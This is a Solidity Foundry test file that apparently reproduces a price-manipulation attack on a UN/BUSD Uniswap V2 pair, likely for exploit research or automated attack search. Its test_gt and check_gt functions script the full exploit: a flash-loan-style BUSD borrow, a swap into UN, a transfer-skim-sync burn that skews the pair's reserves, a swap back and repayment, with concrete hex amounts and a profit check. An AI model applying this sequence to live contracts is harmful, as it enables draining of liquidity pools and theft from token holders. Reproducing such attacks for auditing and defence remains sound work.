// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {BUSD} from "@utils/BUSD.sol";
import {UN} from "./UN.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract UNTestBase is Test, BlockLoader {
    BUSD busd;
    UN un;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address busdAddr;
    address unAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1686054153;
    uint112 reserve0pair = 186912581853851065964787;
    uint112 reserve1pair = 30265800773605712024588;
    uint32 blockTimestampLastpair = 1686054150;
    uint256 kLastpair = 0;
    uint256 price0CumulativeLastpair = 793211419009633925562963933367047369;
    uint256 price1CumulativeLastpair = 1986201436305674573380946799582736123659;
    uint256 totalSupplybusd = 3379997906401637314353418735;
    uint256 balanceOfbusdpair = 30265800773605712024588;
    uint256 balanceOfbusdattacker = 0;
    uint256 totalSupplyun = 10000000000000000000000000;
    uint256 balanceOfunpair = 186912581853851065964787;
    uint256 balanceOfunattacker = 0;

    function setUp() public {
        owner = address(this);
        busd = new BUSD();
        busdAddr = address(busd);
        un = new UN();
        unAddr = address(un);
        pair = new UniswapV2Pair(
            address(un),
            address(busd),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        busd.transfer(address(pair), balanceOfbusdpair);
        un.transfer(address(pair), balanceOfunpair);
        un.setSwapPair(address(pair));
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Busd Balances: ");
        queryERC20BalanceDecimals(
            address(busd),
            address(busd),
            busd.decimals()
        );
        queryERC20BalanceDecimals(address(un), address(busd), un.decimals());
        emit log_string("");
        emit log_string("Un Balances: ");
        queryERC20BalanceDecimals(address(busd), address(un), busd.decimals());
        queryERC20BalanceDecimals(address(un), address(un), un.decimals());
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(busd),
            address(pair),
            busd.decimals()
        );
        queryERC20BalanceDecimals(address(un), address(pair), un.decimals());
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(busd),
            address(attacker),
            busd.decimals()
        );
        queryERC20BalanceDecimals(
            address(un),
            address(attacker),
            un.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return busd.balanceOf(attacker) >= 1e18 + balanceOfbusdattacker;
    }

    function borrow_busd_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        busd.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_busd_owner(uint256 amount) internal eurus {
        busd.transfer(owner, amount);
    }

    function borrow_un_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        un.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_un_owner(uint256 amount) internal eurus {
        un.transfer(owner, amount);
    }

    function swap_pair_attacker_un_busd(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        un.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_busd_un(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        busd.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function burn_un_pair(uint256 amount) internal eurus {
        un.transfer(address(pair), amount);
        pair.skim(attacker);
        pair.sync();
    }

    // function test_gt() public {
    //     vm.startPrank(attacker);
    //     emit log_named_uint("amt0", 29100 * 1e18);
    //     borrow_busd_owner(29100 * 1e18);
    //     printBalance("After step0 ");
    //     emit log_named_uint("amt1", busd.balanceOf(attacker));
    //     emit log_named_uint("amt2", 91480714664455701397200);
    //     swap_pair_attacker_busd_un(
    //         busd.balanceOf(attacker),
    //         91480714664455701397200
    //     );
    //     printBalance("After step1 ");
    //     emit log_named_uint("amt3", (un.balanceOf(attacker) * 93) / 100);
    //     burn_un_pair((un.balanceOf(attacker) * 93) / 100);
    //     printBalance("After step2 ");
    //     emit log_named_uint("amt4", un.balanceOf(attacker));
    //     emit log_named_uint("amt5", 3 * 1e22);
    //     swap_pair_attacker_un_busd(un.balanceOf(attacker), 3 * 1e22);
    //     printBalance("After step3 ");
    //     emit log_named_uint("amt6", (29100 * 1e18 * 1003) / 1000);
    //     payback_busd_owner((29100 * 1e18 * 1003) / 1000);
    //     printBalance("After step4 ");
    //     require(attackGoal(), "Attack failed!");
    //     vm.stopPrank();
    // }

    function test_gt() public {
        uint256 amt0 = 0x231b9a323c565a00000;
        uint256 amt1 = 0x231abc26d11be400000;
        uint256 amt2 = 0xa124cea331dcc000000;
        uint256 amt3 = 0x95d8cebdf4fb1000000;
        uint256 amt4 = 0x919232735ac82000000;
        uint256 amt5 = 0x23369955a5d1fc00000;
        uint256 amt6 = 0x233692654a782800000;
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_busd_owner(amt0);
        printBalance("After step0 ");
        swap_pair_attacker_busd_un(amt1, amt2);
        printBalance("After step1 ");
        emit log_named_decimal_uint("amt3", amt3, 18);
        burn_un_pair(amt3);
        printBalance("After step2 ");
        swap_pair_attacker_un_busd(amt4, amt5);
        printBalance("After step3 ");
        payback_busd_owner(amt6);
        printBalance("After step4 ");
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_busd_owner(amt0);
        swap_pair_attacker_busd_un(amt1, amt2);
        burn_un_pair(amt3);
        swap_pair_attacker_un_busd(amt4, amt5);
        payback_busd_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }
}
